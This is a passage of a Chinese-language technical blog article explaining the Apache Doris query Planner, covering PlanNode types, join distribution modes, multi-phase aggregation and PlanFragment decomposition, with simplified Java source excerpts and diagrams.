                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近Apache Geaflow需要实现异步资源调度，经过和社区成员的沟通后，发现可以沿着doris分片调度的思路去走，故有此系列</p>
<hr/>
<h3 data-id="heading-0">导读</h3>
<ol>
<li><strong>What</strong>：Planner 包含哪些核心组件？PlanNode、PlanFragment 的设计是什么？</li>
<li><strong>Why</strong>：为什么需要将查询计划分片（Fragment）？为什么需要单机计划和分布式计划两个阶段？</li>
<li><strong>How</strong>：Doris 如何构建 PlanNode 树？如何生成分布式执行计划？</li>
<li><strong>How</strong>：各类 PlanNode（Scan、Join、Agg）如何实现？分布式策略如何选择？</li>
</ol>
<h3 data-id="heading-1">核心概念</h3>
<ul>
<li><strong>Planner 架构</strong>：抽象基类 Planner 与 NereidsPlanner 实现</li>
<li><strong>PlanNode 树</strong>：OlapScanNode、HashJoinNode、AggregationNode 等节点实现</li>
<li><strong>PlanFragment</strong>：查询计划的片段化执行单元</li>
<li><strong>分布式计划生成</strong>：DistributePlanner、FragmentExecParams</li>
<li><strong>Backend 选择</strong>：根据数据分布选择执行节点</li>
<li><strong>Runtime Filter</strong>：动态过滤器的生成与应用</li>
<li><strong>数据分区策略</strong>：Shuffle、Broadcast、Colocate Join</li>
<li><strong>Nereids vs 传统 Planner</strong>：新旧优化器对比</li>
</ul>
<hr/>
<h2 data-id="heading-2">1. Planner 整体架构（What &amp; Why）</h2>
<h3 data-id="heading-3">1.1 Planner 在查询处理中的位置</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[已分析的AST] --&gt; B[Planner]
    B --&gt; C[PlanNode树生成]
    C --&gt; D[单节点逻辑计划]
    D --&gt; E[分布式计划转换]
    E --&gt; F[PlanFragment列表]
    F --&gt; G[Coordinator协调器]
    G --&gt; H[BE执行]
</code></pre>
<h3 data-id="heading-4">1.2 Planner 抽象基类设计</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/Planner.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Planner</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOG</span> <span class="hljs-operator">=</span> LogManager.getLogger(Planner.class);
    
    <span class="hljs-comment">// 查询计划被分解为多个 Fragment（片段）</span>
    <span class="hljs-keyword">protected</span> ArrayList&lt;PlanFragment&gt; fragments = Lists.newArrayList();
    
    <span class="hljs-comment">// 查询配置选项</span>
    <span class="hljs-keyword">protected</span> TQueryOptions queryOptions;
    
    <span class="hljs-comment">// 子类必须实现的核心方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;ScanNode&gt; <span class="hljs-title function_">getScanNodes</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">plan</span><span class="hljs-params">(StatementBase queryStmt, 
                              TQueryOptions queryOptions)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> DescriptorTable <span class="hljs-title function_">getDescTable</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> List&lt;RuntimeFilter&gt; <span class="hljs-title function_">getRuntimeFilters</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Optional&lt;ResultSet&gt; <span class="hljs-title function_">handleQueryInFe</span><span class="hljs-params">(StatementBase parsedStmt)</span>;
    
    <span class="hljs-keyword">public</span> List&lt;PlanFragment&gt; <span class="hljs-title function_">getFragments</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> fragments;
    }
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li><strong>抽象基类模式</strong>：定义统一接口，支持多种 Planner 实现</li>
<li><strong>Fragment 列表</strong>：查询被分解为多个可独立执行的片段</li>
<li><strong>扩展点</strong>：
<ul>
<li><code>plan()</code> 方法：核心规划逻辑</li>
<li><code>getScanNodes()</code> 方法：获取所有扫描节点</li>
<li><code>getRuntimeFilters()</code> 方法：获取运行时过滤器</li>
<li><code>handleQueryInFe()</code> 方法：FE 端直接处理的查询</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">1.3 Planner 实现层次</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[Planner 抽象基类] --&gt; B[NereidsPlanner]
    A --&gt; C[GroupCommitPlanner]
    B --&gt; D[PrepareCommandPlanner]
    B --&gt; E[FastInsertIntoValuesPlanner]
</code></pre>
<p><strong>主要实现类</strong>：</p>
<ol>
<li>
<p><strong>NereidsPlanner</strong>：新一代优化器的 Planner</p>
<ul>
<li>位置：<code>fe/fe-core/src/main/java/org/apache/doris/nereids/NereidsPlanner.java</code></li>
<li>基于 Cascades 框架的 CBO 优化器</li>
<li>支持更丰富的优化规则和统计信息</li>
</ul>
</li>
<li>
<p><strong>GroupCommitPlanner</strong>：Group Commit 场景的 Planner</p>
<ul>
<li>位置：<code>fe/fe-core/src/main/java/org/apache/doris/planner/GroupCommitPlanner.java</code></li>
<li>针对批量写入优化</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-6">2. PlanNode 节点树设计</h2>
<h3 data-id="heading-7">2.1 PlanNode 抽象基类</h3>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/PlanNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">protected</span> PlanNodeId id;          <span class="hljs-comment">// 节点唯一标识</span>
    <span class="hljs-keyword">protected</span> PlanFragmentId fragmentId;  <span class="hljs-comment">// 所属 Fragment ID</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">long</span> limit;             <span class="hljs-comment">// LIMIT 限制</span>
    <span class="hljs-keyword">protected</span> List&lt;TupleId&gt; tupleIds;     <span class="hljs-comment">// 输出的 Tuple ID 列表</span>
    <span class="hljs-keyword">protected</span> List&lt;TupleId&gt; nullableTupleIds;  <span class="hljs-comment">// 可为 NULL 的 Tuple ID</span>
    <span class="hljs-keyword">protected</span> List&lt;Expr&gt; conjuncts;   <span class="hljs-comment">// 谓词条件（WHERE 子句）</span>
    <span class="hljs-keyword">protected</span> List&lt;RuntimeFilter&gt; runtimeFilters;  <span class="hljs-comment">// 运行时过滤器</span>
    <span class="hljs-keyword">protected</span> ArrayList&lt;PlanNode&gt; children;  <span class="hljs-comment">// 子节点</span>
    
    <span class="hljs-comment">// 统计信息</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">long</span> cardinality;       <span class="hljs-comment">// 输出行数估算</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">double</span> avgRowSize;      <span class="hljs-comment">// 平均行大小</span>
    
    <span class="hljs-comment">// 核心方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeStats</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException;
    
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">treeToThrift</span><span class="hljs-params">(TPlanNode container)</span>;
}
</code></pre>
<p><strong>设计要点</strong>：</p>
<ol>
<li><strong>树形结构</strong>：每个 PlanNode 可以有多个 children</li>
<li><strong>谓词下推</strong>：conjuncts 存储可以在该节点执行的过滤条件</li>
<li><strong>统计信息</strong>：cardinality、avgRowSize 用于代价估算</li>
<li><strong>Runtime Filter</strong>：动态生成的过滤器，用于优化 Join 性能</li>
<li><strong>Tuple 模型</strong>：输出数据以 Tuple（元组）形式表示</li>
</ol>
<h3 data-id="heading-8">2.2 PlanNode 类型层次</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[PlanNode] --&gt; B[ScanNode]
    A --&gt; C[JoinNodeBase]
    A --&gt; D[AggregationNode]
    A --&gt; E[SortNode]
    A --&gt; F[UnionNode]
    A --&gt; G[ExchangeNode]
    A --&gt; H[SelectNode]
    
    B --&gt; B1[OlapScanNode]
    B --&gt; B2[SchemaScanNode]
    B --&gt; B3[FileScanNode]
    B --&gt; B4[JdbcScanNode]
    
    C --&gt; C1[HashJoinNode]
    C --&gt; C2[NestLoopJoinNode]
    C --&gt; C3[CrossJoinNode]
</code></pre>
<h3 data-id="heading-9">2.3 核心 PlanNode 详解</h3>
<h4 data-id="heading-10">2.3.1 OlapScanNode（OLAP 表扫描节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/OlapScanNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OlapScanNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ScanNode</span> {
    <span class="hljs-keyword">private</span> OlapTable olapTable;
    
    <span class="hljs-comment">// 分区裁剪结果</span>
    <span class="hljs-keyword">private</span> Collection&lt;Long&gt; selectedPartitionIds;
    
    <span class="hljs-comment">// Tablet 分布信息</span>
    <span class="hljs-keyword">private</span> Map&lt;Long, Integer&gt; bucketSeq2locations;
    <span class="hljs-keyword">private</span> List&lt;Long&gt; scanTabletIds;
    
    <span class="hljs-comment">// 预聚合标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isPreAggregation</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">reasonOfPreAggregation</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-comment">// 索引选择</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> selectedIndexId;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(Analyzer analyzer)</span> <span class="hljs-keyword">throws</span> UserException {
        <span class="hljs-built_in">super</span>.init(analyzer);
        
        <span class="hljs-comment">// 1. 分区裁剪</span>
        selectedPartitionIds = partitionPrune(analyzer);
        
        <span class="hljs-comment">// 2. 选择最优索引（Rollup 或物化视图）</span>
        selectedIndexId = selectBestRollupByRollupSelector(analyzer);
        
        <span class="hljs-comment">// 3. Tablet 裁剪和分配</span>
        computeTabletInfo();
        
        <span class="hljs-comment">// 4. 判断是否可以预聚合</span>
        canPreAggregation();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">computeTabletInfo</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 根据分区选择 Tablet</span>
        <span class="hljs-keyword">for</span> (Long partitionId : selectedPartitionIds) {
            <span class="hljs-type">Partition</span> <span class="hljs-variable">partition</span> <span class="hljs-operator">=</span> olapTable.getPartition(partitionId);
            <span class="hljs-type">MaterializedIndex</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> partition.getIndex(selectedIndexId);
            
            <span class="hljs-keyword">for</span> (Tablet tablet : index.getTablets()) {
                scanTabletIds.add(tablet.getId());
                
                <span class="hljs-comment">// 获取 Tablet 的副本位置</span>
                List&lt;Replica&gt; replicas = tablet.getReplicas();
                <span class="hljs-keyword">for</span> (Replica replica : replicas) {
                    <span class="hljs-type">Backend</span> <span class="hljs-variable">backend</span> <span class="hljs-operator">=</span> Catalog.getCurrentSystemInfo()
                        .getBackend(replica.getBackendId());
                    <span class="hljs-keyword">if</span> (backend.isAlive()) {
                        <span class="hljs-comment">// 记录 Backend 位置信息</span>
                    }
                }
            }
        }
    }
}
</code></pre>
<p><strong>关键功能</strong>：</p>
<ol>
<li>
<p><strong>分区裁剪（Partition Pruning）</strong>：</p>
<ul>
<li>根据 WHERE 条件过滤不需要扫描的分区</li>
<li>减少数据扫描量</li>
</ul>
</li>
<li>
<p><strong>索引选择（Rollup Selection）</strong>：</p>
<ul>
<li>根据查询列和过滤条件选择最优索引</li>
<li>优先选择列数少、数据量小的 Rollup</li>
</ul>
</li>
<li>
<p><strong>Tablet 分配</strong>：</p>
<ul>
<li>为每个 Tablet 选择可用的 Replica</li>
<li>考虑 Backend 负载均衡</li>
</ul>
</li>
<li>
<p><strong>预聚合优化</strong>：</p>
<ul>
<li>对于聚合模型，判断是否可以利用预聚合结果</li>
<li>避免重复计算</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11">2.3.2 HashJoinNode（哈希连接节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/HashJoinNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashJoinNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JoinNodeBase</span> {
    <span class="hljs-comment">// 等值连接条件：a = b 或 a &lt;=&gt; b</span>
    <span class="hljs-keyword">private</span> List&lt;BinaryPredicate&gt; eqJoinConjuncts = Lists.newArrayList();
    
    <span class="hljs-comment">// 非等值连接条件</span>
    <span class="hljs-keyword">private</span> List&lt;Expr&gt; otherJoinConjuncts;
    
    <span class="hljs-comment">// 分布式执行模式</span>
    <span class="hljs-keyword">private</span> DistributionMode distrMode;
    
    <span class="hljs-comment">// Colocate Join 标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isColocate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">colocateReason</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DistributionMode</span> {
        NONE,           <span class="hljs-comment">// 本地 Join（数据已在同一节点）</span>
        BROADCAST,      <span class="hljs-comment">// 广播小表</span>
        PARTITIONED,    <span class="hljs-comment">// 双边 Shuffle</span>
        BUCKET_SHUFFLE, <span class="hljs-comment">// 桶 Shuffle</span>
        COLOCATE        <span class="hljs-comment">// Colocate Join（数据已按相同规则分布）</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HashJoinNode</span><span class="hljs-params">(PlanNodeId id, PlanNode outer, PlanNode inner,
                        TableRefInfo innerRef, List&lt;Expr&gt; eqJoinConjuncts,
                        List&lt;Expr&gt; otherJoinConjuncts)</span> {
        <span class="hljs-built_in">super</span>(id, <span class="hljs-string">"HASH JOIN"</span>, StatisticalType.HASH_JOIN_NODE, 
              outer, inner, innerRef);
        
        <span class="hljs-comment">// 处理等值连接条件</span>
        <span class="hljs-keyword">for</span> (Expr eqJoinPredicate : eqJoinConjuncts) {
            <span class="hljs-type">BinaryPredicate</span> <span class="hljs-variable">eqJoin</span> <span class="hljs-operator">=</span> (BinaryPredicate) eqJoinPredicate;
            
            <span class="hljs-comment">// EQ_FOR_NULL (&lt;=&gt; 操作符) 可能转换为 EQ</span>
            <span class="hljs-keyword">if</span> (eqJoin.getOp().equals(BinaryPredicate.Operator.EQ_FOR_NULL)) {
                <span class="hljs-keyword">if</span> (!eqJoin.getChild(<span class="hljs-number">0</span>).isNullable() || 
                    !eqJoin.getChild(<span class="hljs-number">1</span>).isNullable()) {
                    eqJoin.setOp(BinaryPredicate.Operator.EQ);
                }
            }
            <span class="hljs-built_in">this</span>.eqJoinConjuncts.add(eqJoin);
        }
        
        <span class="hljs-built_in">this</span>.otherJoinConjuncts = otherJoinConjuncts;
        <span class="hljs-built_in">this</span>.distrMode = DistributionMode.NONE;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span> {
        msg.node_type = TPlanNodeType.HASH_JOIN_NODE;
        msg.hash_join_node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">THashJoinNode</span>();
        msg.hash_join_node.join_op = joinOp.toThrift();
        
        <span class="hljs-comment">// 标识是否为广播 Join</span>
        msg.hash_join_node.setIsBroadcastJoin(
            distrMode == DistributionMode.BROADCAST);
        
        <span class="hljs-comment">// 序列化等值连接条件</span>
        <span class="hljs-keyword">for</span> (BinaryPredicate eqJoinPredicate : eqJoinConjuncts) {
            <span class="hljs-type">TEqJoinCondition</span> <span class="hljs-variable">eqJoinCondition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TEqJoinCondition</span>(
                eqJoinPredicate.getChild(<span class="hljs-number">0</span>).treeToThrift(),
                eqJoinPredicate.getChild(<span class="hljs-number">1</span>).treeToThrift()
            );
            eqJoinCondition.setOpcode(eqJoinPredicate.getOp().getOpcode());
            msg.hash_join_node.addToEqJoinConjuncts(eqJoinCondition);
        }
        
        <span class="hljs-comment">// 序列化非等值连接条件</span>
        <span class="hljs-keyword">for</span> (Expr e : otherJoinConjuncts) {
            msg.hash_join_node.addToOtherJoinConjuncts(e.treeToThrift());
        }
    }
}
</code></pre>
<p><strong>Join 分布式策略选择</strong>：</p>
<ol>
<li>
<p><strong>BROADCAST（广播）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：右表很小（通常 &lt; 100MB）</li>
<li><strong>执行方式</strong>：将右表广播到所有执行左表扫描的节点</li>
<li><strong>优点</strong>：避免大表 Shuffle，网络传输小</li>
<li><strong>缺点</strong>：每个节点都要存储右表完整数据</li>
</ul>
</li>
<li>
<p><strong>PARTITIONED（分区/Shuffle）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：两表都很大</li>
<li><strong>执行方式</strong>：按 Join Key 对两表进行 Hash 分区</li>
<li><strong>优点</strong>：内存占用小，适合大表 Join</li>
<li><strong>缺点</strong>：需要 Shuffle 两表数据，网络开销大</li>
</ul>
</li>
<li>
<p><strong>COLOCATE（数据本地化）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：两表按相同分桶键分布</li>
<li><strong>执行方式</strong>：数据已在相同节点，本地 Join</li>
<li><strong>优点</strong>：无需数据移动，性能最优</li>
<li><strong>缺点</strong>：表创建时需要规划 Colocate Group</li>
</ul>
</li>
<li>
<p><strong>BUCKET_SHUFFLE（桶 Shuffle）</strong>：</p>
<ul>
<li><strong>适用场景</strong>：一侧表已按 Join Key 分桶</li>
<li><strong>执行方式</strong>：只 Shuffle 另一侧表</li>
<li><strong>优点</strong>：减少一半的 Shuffle 数据量</li>
<li><strong>缺点</strong>：需要分桶表参与</li>
</ul>
</li>
</ol>
<h4 data-id="heading-12">2.3.3 AggregationNode（聚合节点）</h4>
<p><strong>位置</strong>：<code>fe/fe-core/src/main/java/org/apache/doris/planner/AggregationNode.java</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AggregationNode</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PlanNode</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AggregateInfo aggInfo;
    
    <span class="hljs-comment">// 是否需要 Finalize 阶段（分布式聚合的最后一步）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> needsFinalize;
    
    <span class="hljs-comment">// 是否使用流式预聚合</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> useStreamingPreagg;
    
    <span class="hljs-comment">// Colocate 聚合标识</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isColocate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// 按 Group Key 排序的信息</span>
    <span class="hljs-keyword">private</span> SortInfo sortByGroupKey;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AggregationNode</span><span class="hljs-params">(PlanNodeId id, PlanNode input, 
                          AggregateInfo aggInfo)</span> {
        <span class="hljs-built_in">super</span>(id, aggInfo.getOutputTupleId().asList(), 
              <span class="hljs-string">"AGGREGATE"</span>, StatisticalType.AGG_NODE);
        <span class="hljs-built_in">this</span>.aggInfo = aggInfo;
        <span class="hljs-built_in">this</span>.children.add(input);
        <span class="hljs-built_in">this</span>.needsFinalize = <span class="hljs-literal">true</span>;
        updateplanNodeName();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateplanNodeName</span><span class="hljs-params">()</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        sb.append(<span class="hljs-string">"VAGGREGATE"</span>);
        sb.append(<span class="hljs-string">" ("</span>);
        
        <span class="hljs-keyword">if</span> (aggInfo.isMerge()) {
            sb.append(<span class="hljs-string">"merge"</span>);      <span class="hljs-comment">// 合并中间结果</span>
        } <span class="hljs-keyword">else</span> {
            sb.append(<span class="hljs-string">"update"</span>);     <span class="hljs-comment">// 更新聚合状态</span>
        }
        
        <span class="hljs-keyword">if</span> (needsFinalize) {
            sb.append(<span class="hljs-string">" finalize"</span>);  <span class="hljs-comment">// 输出最终结果</span>
        } <span class="hljs-keyword">else</span> {
            sb.append(<span class="hljs-string">" serialize"</span>); <span class="hljs-comment">// 序列化中间状态</span>
        }
        sb.append(<span class="hljs-string">")"</span>);
        setPlanNodeName(sb.toString());
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toThrift</span><span class="hljs-params">(TPlanNode msg)</span> {
        msg.node_type = TPlanNodeType.AGGREGATION_NODE;
        
        <span class="hljs-comment">// 序列化聚合函数</span>
        List&lt;TExpr&gt; aggregateFunctions = Lists.newArrayList();
        <span class="hljs-keyword">for</span> (FunctionCallExpr e : aggInfo.getMaterializedAggregateExprs()) {
            aggregateFunctions.add(e.treeToThrift());
        }
        
        msg.agg_node = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TAggregationNode</span>(
            aggregateFunctions,
            aggInfo.getOutputTupleId().asInt(),
            aggInfo.getOutputTupleId().asInt(), 
            needsFinalize
        );
        
        msg.agg_node.setUseStreamingPreaggregation(useStreamingPreagg);
        msg.agg_node.setIsColocate(isColocate);
        
        <span class="hljs-comment">// 序列化分组表达式</span>
        List&lt;Expr&gt; groupingExprs = aggInfo.getGroupingExprs();
        <span class="hljs-keyword">if</span> (groupingExprs != <span class="hljs-literal">null</span>) {
            msg.agg_node.setGroupingExprs(Expr.treesToThrift(groupingExprs));
        }
    }
}
</code></pre>
<p><strong>聚合分阶段执行</strong>：</p>
<ol>
<li>
<p><strong>单阶段聚合</strong>（Single-Phase Aggregation）：</p>
<ul>
<li>适用场景：数据量小或无 GROUP BY</li>
<li>执行方式：单节点完成所有聚合</li>
<li>示例：<code>SELECT COUNT(*) FROM table</code></li>
</ul>
</li>
<li>
<p><strong>两阶段聚合</strong>（Two-Phase Aggregation）：</p>
<ul>
<li>适用场景：分布式大数据集聚合</li>
<li><strong>第一阶段（Update/Serialize）</strong>：
<ul>
<li>在各个 BE 节点本地聚合（预聚合）</li>
<li>输出中间聚合状态（序列化）</li>
</ul>
</li>
<li><strong>第二阶段（Merge/Finalize）</strong>：
<ul>
<li>按 Group Key Shuffle 数据</li>
<li>合并中间状态并输出最终结果</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>三阶段聚合</strong>（Three-Phase Aggregation）：</p>
<ul>
<li>适用场景：高基数 GROUP BY + 大数据量</li>
<li><strong>第一阶段</strong>：本地预聚合</li>
<li><strong>第二阶段</strong>：中间合并（减少数据量）</li>
<li><strong>第三阶段</strong>：最终聚合</li>
</ul>
</li>
</ol>
<p><strong>流式预聚合（Streaming Preagg）</strong>：</p>
<ul>
<li><strong>启用条件</strong>：
<ul>
<li>GROUP BY 列基数适中（不是太高）</li>
<li>输入数据有一定局部性（相同 Key 相邻）</li>
</ul>
</li>
<li><strong>优点</strong>：
<ul>
<li>边读边聚合，减少内存占用</li>
<li>提前过滤数据，减少网络传输</li>
</ul>
</li>
<li><strong>禁用场景</strong>：
<ul>
<li>GROUP BY 列基数极高（预聚合效果差）</li>
<li>聚合函数不支持流式（如 PERCENTILE）</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-13">3. PlanFragment 片段化执行（What &amp; Why）</h2>
<h3 data-id="heading-14">3.1 为什么需要 Fragment</h3>
<p><strong>问题</strong>：一个复杂查询如何在分布式环境中执行？</p>
<p><strong>解决方案</strong>：将查询计划分解为多个 <strong>PlanFragment</strong>（片段），每个 Fragment 可以在不同节点并行执行。</p>
<p><strong>示例查询</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> t1.id, <span class="hljs-built_in">SUM</span>(t2.amount)
<span class="hljs-keyword">FROM</span> table1 t1
<span class="hljs-keyword">JOIN</span> table2 t2 <span class="hljs-keyword">ON</span> t1.id <span class="hljs-operator">=</span> t2.id
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> t1.id;
</code></pre>
<p><strong>Fragment 分解</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">Fragment <span class="hljs-number">2</span> (Final Aggregation &amp; Output)
    └── VAGGREGATE (merge finalize)
